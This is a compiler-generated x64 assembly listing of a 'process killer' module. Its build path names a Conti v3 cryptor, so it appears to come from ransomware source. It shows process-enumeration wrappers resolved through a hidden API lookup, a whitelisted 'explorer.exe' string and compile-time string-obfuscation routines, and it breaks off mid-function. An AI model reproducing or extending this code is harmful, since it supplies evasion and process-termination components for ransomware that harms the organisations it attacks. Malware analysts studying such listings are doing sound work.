; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33522.0 

include listing.inc

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

msvcjmc	SEGMENT
__0ED14FEE_winpackagefamily@h DB 01H
__F92EF742_winapifamily@h DB 01H
__22E515EB_sdkddkver@h DB 01H
__FE09AF47_concurrencysal@h DB 01H
__C073CA79_sal@h DB 01H
__D6AFE870_vadefs@h DB 01H
__D63E96CF_vcruntime@h DB 01H
__514B86D7_excpt@h DB 01H
__9A7D38D9_stdarg@h DB 01H
__29F49F40_specstrings_undef@h DB 01H
__D0F42932_specstrings_strict@h DB 01H
__F00405FD_sdv_driverspecs@h DB 01H
__173E09CA_driverspecs@h DB 01H
__9A452361_specstrings@h DB 01H
__1B0272D9_corecrt@h DB 01H
__74484FB3_corecrt_wctype@h DB 01H
__1EC467ED_ctype@h DB 01H
__98517906_kernelspecs@h DB 01H
__D3497022_basetsd@h DB 01H
__61CC25A1_errno@h DB 01H
__3EADF068_vcruntime_string@h DB 01H
__E4C945B4_corecrt_memcpy_s@h DB 01H
__8EAFF484_corecrt_memory@h DB 01H
__6490AEC5_corecrt_wstring@h DB 01H
__E8295E1E_string@h DB 01H
__7FCB5136_guiddef@h DB 01H
__FF8A9E11_pshpack4@h DB 01H
__D5438902_poppack@h DB 01H
__FB07E2A3_pshpack2@h DB 01H
__F6906775_pshpack8@h DB 01H
__F9415CFA_pshpack1@h DB 01H
__E58C6F1C_apiset@h DB 01H
__A5C52262_ktmtypes@h DB 01H
__FBBA8F9D_winnt@h DB 01H
__A32D3D2C_minwindef@h DB 01H
__7D798299_windef@h DB 01H
__9AE108E9_apisetcconv@h DB 01H
__9CE53D2C_minwinbase@h DB 01H
__5D0AA210_apiquery2@h DB 01H
__4DD4E726_processenv@h DB 01H
__3575CC96_fileapi@h DB 01H
__8EA220E6_fileapifromapp@h DB 01H
__BF9B31FE_debugapi@h DB 01H
__C3AFE134_utilapiset@h DB 01H
__76F69E51_handleapi@h DB 01H
__7E63D784_errhandlingapi@h DB 01H
__FFA7003C_fibersapi@h DB 01H
__8971CECF_namedpipeapi@h DB 01H
__46C9D8A6_profileapi@h DB 01H
__98D4F0A3_heapapi@h DB 01H
__50EF2A88_ioapiset@h DB 01H
__92EA1464_synchapi@h DB 01H
__A53D8AED_interlockedapi@h DB 01H
__B506CAAF_processthreadsapi@h DB 01H
__FF735694_sysinfoapi@h DB 01H
__29589789_memoryapi@h DB 01H
__E9C7A663_enclaveapi@h DB 01H
__D035F9F7_threadpoollegacyapiset@h DB 01H
__C899130C_threadpoolapiset@h DB 01H
__E0441EE7_jobapi@h DB 01H
__CEF86838_jobapi2@h DB 01H
__35AC6B9A_wow64apiset@h DB 01H
__C8AE41A5_libloaderapi@h DB 01H
__CC9E232D_securitybaseapi@h DB 01H
__C9D0C9B8_namespaceapi@h DB 01H
__30FF9CAD_systemtopologyapi@h DB 01H
__4D358795_processtopologyapi@h DB 01H
__40446D10_securityappcontainer@h DB 01H
__3A952EDF_realtimeapiset@h DB 01H
__F4865F4B_winerror@h DB 01H
__53C1BD93_timezoneapi@h DB 01H
__1FFBEDBF_winbase@h DB 01H
__43D3FA34_wingdi@h DB 01H
__D24A7391_tvout@h DB 01H
__7713A6C8_winuser@h DB 01H
__0B345F71_datetimeapi@h DB 01H
__9AC6960C_winnls@h DB 01H
__973A40A8_stringapiset@h DB 01H
__CC46FEE2_wincontypes@h DB 01H
__97D70BE1_consoleapi@h DB 01H
__27EC5E18_consoleapi2@h DB 01H
__262E342F_consoleapi3@h DB 01H
__641DCD70_wincon@h DB 01H
__5A96C7A7_verrsrc@h DB 01H
__B69C6FF2_winver@h DB 01H
__7AEB8C37_reason@h DB 01H
__59F1A8A9_winreg@h DB 01H
__EE0E2B7F_wnnc@h DB 01H
__DCDB7054_winnetwk@h DB 01H
__EDC72EEB_cderr@h DB 01H
__95F9199D_dde@h DB 01H
__66427627_ddeml@h DB 01H
__957C29A0_dlgs@h DB 01H
__12EA15AF_lzexpand@h DB 01H
__62131F15_mmsyscom@h DB 01H
__47E68D49_mciapi@h DB 01H
__5D7DD356_mmiscapi@h DB 01H
__7223D2EF_mmiscapi2@h DB 01H
__A330DBB3_playsoundapi@h DB 01H
__601B366F_mmeapi@h DB 01H
__1134ADD5_timeapi@h DB 01H
__93F2265A_joystickapi@h DB 01H
__DF6EB4E3_mmsystem@h DB 01H
__BD641FCB_nb30@h DB 01H
__DF8704F0_rpcdcep@h DB 01H
__5C6CA7BB_rpcdce@h DB 01H
__853533C4_rpcnsi@h DB 01H
__2D2406C3_rpcnterr@h DB 01H
__64521D71_rpcasync@h DB 01H
__AADCBA08_rpc@h DB 01H
__19E26CFF_shellapi@h DB 01H
__1E9F31D3_winperf@h DB 01H
__32C6F875_winsock@h DB 01H
__7953A3F8_bcrypt@h DB 01H
__E4169492_ncrypt@h DB 01H
__AF3DDDC3_dpapi@h DB 01H
__D1E23BF2_wincrypt@h DB 01H
__82AB4779_winefs@h DB 01H
__1FE431C9_rpcnsip@h DB 01H
__2B741F2D_rpcsal@h DB 01H
__92623256_rpcndr@h DB 01H
__9C18532E_wtypesbase@h DB 01H
__EA2E1D6D_wtypes@h DB 01H
__7DDD9F45_winioctl@h DB 01H
__E550A843_winsmcrd@h DB 01H
__9809C1BA_winscard@h DB 01H
__EA174FA4_prsht@h DB 01H
__0E1BD114_winspool@h DB 01H
__45DED006_corecrt_malloc@h DB 01H
__13F5961F_stddef@h DB 01H
__FD6DBD68_corecrt_search@h DB 01H
__E2E33A61_corecrt_wstdlib@h DB 01H
__10D4A829_limits@h DB 01H
__6E5ACABA_stdlib@h DB 01H
__30B1AFDA_unknwnbase@h DB 01H
__328C1996_objidlbase@h DB 01H
__C4E06B6A_cguid@h DB 01H
__434718C5_combaseapi@h DB 01H
__DE6FDEF1_unknwn@h DB 01H
__CCE0BACC_objidl@h DB 01H
__8C7011E5_oaidl@h DB 01H
__2E0B7863_propidlbase@h DB 01H
__BF4CF2EC_coml2api@h DB 01H
__6D897344_oleidl@h DB 01H
__1129FC2C_servprov@h DB 01H
__757952E4_msxml@h DB 01H
__B1191D53_urlmon@h DB 01H
__404D1A47_propidl@h DB 01H
__A1C63593_objbase@h DB 01H
__C1B0A9CB_oleauto@h DB 01H
__24EAF61F_ole2@h DB 01H
__2B1843DA_commdlg@h DB 01H
__81DDEDE3_stralign@h DB 01H
__2134D1B4_winsvc@h DB 01H
__11C07376_mcx@h DB 01H
__577CE3E7_ime_cmodes@h DB 01H
__1E72C31E_imm@h DB 01H
__E15BF856_windows@h DB 01H
__832A4112_inaddr@h DB 01H
__C59B8995_ws2def@h DB 01H
__F9202461_qos@h DB 01H
__50CB22FA_WinSock2@h DB 01H
__32E3D3D2_xkeycheck@h DB 01H
__CFD6EDFA_yvals_core@h DB 01H
__BE6CFB00___msvc_sanitizer_annotate_container@hpp DB 01H
__A3D3E4E8_vcruntime_new@h DB 01H
__8D1A214D_vcruntime_new_debug@h DB 01H
__935DC21B_crtdbg@h DB 01H
__497BC13E_crtdefs@h DB 01H
__DDE8D0E0_use_ansi@h DB 01H
__AE7FBCDF_yvals@h DB 01H
__44420885_corecrt_stdio_config@h DB 01H
__AB601D8D_corecrt_wstdio@h DB 01H
__C1EC35D3_stdio@h DB 01H
__1C5946C5_cstdio DB 01H
__54ADA280_cstring DB 01H
__EF1F6BBA_corecrt_wconio@h DB 01H
__3D1D430C_corecrt_wdirect@h DB 01H
__8ECB7138_corecrt_share@h DB 01H
__DB7FEBA6_corecrt_wio@h DB 01H
__9A9F0068_corecrt_wprocess@h DB 01H
__369A9BC3_corecrt_wtime@h DB 01H
__CE789B9D_types@h DB 01H
__9901C817_stat@h DB 01H
__3FCAD62E_wchar@h DB 01H
__86D29096_cwchar DB 01H
__26E6E2A9_xtr1common DB 01H
__C51215A0_iosfwd DB 01H
__AEA28616_stdint@h DB 01H
__A561EB1D_cstdint DB 01H
__BB16330F_corecrt_math@h DB 01H
__3BF2A406_math@h DB 01H
__183F0A60_cstdlib DB 01H
__B9985323_float@h DB 01H
__6F1D8D42_cfloat DB 01H
__9CD02892_climits DB 01H
__F5A7E1DF_intrin0@inl@h DB 01H
__50567835_intrin0@h DB 01H
__09FBC026_limits DB 01H
__BDF4D0CD_cstddef DB 01H
__7C4A1519_type_traits DB 01H
__FA77ED4C_malloc@h DB 01H
__89766DA4_corecrt_terminate@h DB 01H
__EEF52EF9_eh@h DB 01H
__85F4241F_vcruntime_exception@h DB 01H
__8124AFA8_exception DB 01H
__5003AD96_new DB 01H
__8B28237E_xatomic@h DB 01H
__E4CFD974_initializer_list DB 01H
__2F328FEB_utility DB 01H
__91F58E7E___msvc_iter_core@hpp DB 01H
__C27AFEEB_xutility DB 01H
__45A7EC28_xmemory DB 01H
__31746AB4_xstring DB 01H
__1392A162_cctype DB 01H
__C1864A34_string DB 01H
__9D469CC8_common@h DB 01H
__016BD130_queue@h DB 01H
__62742911_prockiller@h DB 01H
__AAAC9FBE_TlHelp32@h DB 01H
__B86B48E4_winternl@h DB 01H
__AE454FA2_lmcons@h DB 01H
__67F5F762_mprapidef@h DB 01H
__1F2B86E1_ipifcons@h DB 01H
__EFFE9D94_ifdef@h DB 01H
__AF31E881_ifmib@h DB 01H
__8BC2807C_nldef@h DB 01H
__7ABE0907_ipmib@h DB 01H
__2E95CCCA_tcpmib@h DB 01H
__2798F2DA_udpmib@h DB 01H
__FCC255DB_iprtrmib@h DB 01H
__B01BC3FD_in6addr@h DB 01H
__D834A143_ipexport@h DB 01H
__0A9237D2_time@h DB 01H
__82EB0637_iptypes@h DB 01H
__6063C472_tcpestats@h DB 01H
__63D3B6A5_netioapi@h DB 01H
__D1674A86_iphlpapi@h DB 01H
__F5D3A320_RestartManager@h DB 01H
__9B49ECA4_getapi@h DB 01H
__62F75DE5_metarandom2@h DB 01H
__93160BA8_array DB 01H
__722C6D77_MetaString@h DB 01H
__ED66B863_memory@h DB 01H
__62043E23_prockiller@cpp DB 01H
msvcjmc	ENDS
CONST	SEGMENT
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
CONST	ENDS
PUBLIC	?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z ; process_killer::GetWhiteListProcess
PUBLIC	?pCloseHandle@@YAHPEAX@Z			; pCloseHandle
PUBLIC	?plstrcmpiW@@YAHPEB_W0@Z			; plstrcmpiW
PUBLIC	?pCreateToolhelp32Snapshot@@YAPEAXKK@Z		; pCreateToolhelp32Snapshot
PUBLIC	?pProcess32FirstW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z ; pProcess32FirstW
PUBLIC	?pProcess32NextW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z ; pProcess32NextW
PUBLIC	?positive_modulo@@YAHHH@Z			; positive_modulo
PUBLIC	??0?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
PUBLIC	__JustMyCode_Default
PUBLIC	??_C@_1BK@BPIGMGKF@?$AAe?$AAx?$AAp?$AAl?$AAo?$AAr?$AAe?$AAr?$AA?4?$AAe?$AAx?$AAe@ ; `string'
EXTRN	?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z:PROC	; getapi::GetProcAddressEx2
EXTRN	?m_malloc@@YAPEAX_K@Z:PROC			; m_malloc
EXTRN	_RTC_CheckStackVars:PROC
EXTRN	_RTC_InitBase:PROC
EXTRN	_RTC_Shutdown:PROC
EXTRN	__CheckForDebuggerJustMyCode:PROC
EXTRN	__GSHandlerCheck:PROC
EXTRN	__security_check_cookie:PROC
EXTRN	__security_cookie:QWORD
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z DD imagerel $LN13
	DD	imagerel $LN13+380
	DD	imagerel $unwind$?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCloseHandle@@YAHPEAX@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pCloseHandle@@YAHPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?plstrcmpiW@@YAHPEB_W0@Z DD imagerel $LN3
	DD	imagerel $LN3+91
	DD	imagerel $unwind$?plstrcmpiW@@YAHPEB_W0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCreateToolhelp32Snapshot@@YAPEAXKK@Z DD imagerel $LN3
	DD	imagerel $LN3+87
	DD	imagerel $unwind$?pCreateToolhelp32Snapshot@@YAPEAXKK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pProcess32FirstW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z DD imagerel $LN3
	DD	imagerel $LN3+91
	DD	imagerel $unwind$?pProcess32FirstW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pProcess32NextW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z DD imagerel $LN3
	DD	imagerel $LN3+91
	DD	imagerel $unwind$?pProcess32NextW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?positive_modulo@@YAHHH@Z DD imagerel $LN3
	DD	imagerel $LN3+74
	DD	imagerel $unwind$?positive_modulo@@YAHHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+1172
	DD	imagerel $unwind$??0?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT rtc$TMZ
rtc$TMZ	SEGMENT
_RTC_Shutdown.rtc$TMZ DQ FLAT:_RTC_Shutdown
rtc$TMZ	ENDS
;	COMDAT rtc$IMZ
rtc$IMZ	SEGMENT
_RTC_InitBase.rtc$IMZ DQ FLAT:_RTC_InitBase
rtc$IMZ	ENDS
;	COMDAT ??_C@_1BK@BPIGMGKF@?$AAe?$AAx?$AAp?$AAl?$AAo?$AAr?$AAe?$AAr?$AA?4?$AAe?$AAx?$AAe@
CONST	SEGMENT
??_C@_1BK@BPIGMGKF@?$AAe?$AAx?$AAp?$AAl?$AAo?$AAr?$AAe?$AAr?$AA?4?$AAe?$AAx?$AAe@ DB 'e'
	DB	00H, 'x', 00H, 'p', 00H, 'l', 00H, 'o', 00H, 'r', 00H, 'e', 00H
	DB	'r', 00H, '.', 00H, 'e', 00H, 'x', 00H, 'e', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0479H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?positive_modulo@@YAHHH@Z DD 025051601H
	DD	01112316H
	DD	0700a001dH
	DD	05009H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pProcess32NextW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pProcess32FirstW@@YAHPEAXPEAUtagPROCESSENTRY32W@@@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCreateToolhelp32Snapshot@@YAPEAXKK@Z DD 025051601H
	DD	01112316H
	DD	0700a0021H
	DD	05009H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?plstrcmpiW@@YAHPEB_W0@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pCloseHandle@@YAHPEAX@Z DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	036H
	DW	0163H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z DD 025053d19H
	DD	010e2313H
	DD	070070091H
	DD	05006H
	DD	imagerel __GSHandlerCheck
	DD	0478H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z$rtcName$0 DB 070H ; process_killer::GetWhiteListProcess
	DB	065H
	DB	033H
	DB	032H
	DB	00H
	ORG $+11
?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z$rtcVarDesc DD 050H ; process_killer::GetWhiteListProcess
	DD	0238H
	DQ	FLAT:?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z$rtcName$0
	ORG $+48
?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z$rtcFrameData DD 01H ; process_killer::GetWhiteListProcess
	DD	00H
	DQ	FLAT:?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z$rtcVarDesc
CONST	ENDS
; Function compile flags: /Odt
;	COMDAT __JustMyCode_Default
_TEXT	SEGMENT
__JustMyCode_Default PROC				; COMDAT
  00000	c2 00 00	 ret	 0
__JustMyCode_Default ENDP
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 5c	 sub	 eax, 92			; 0000005cH
  0002d	6b c0 ec	 imul	 eax, eax, -20
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BD@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
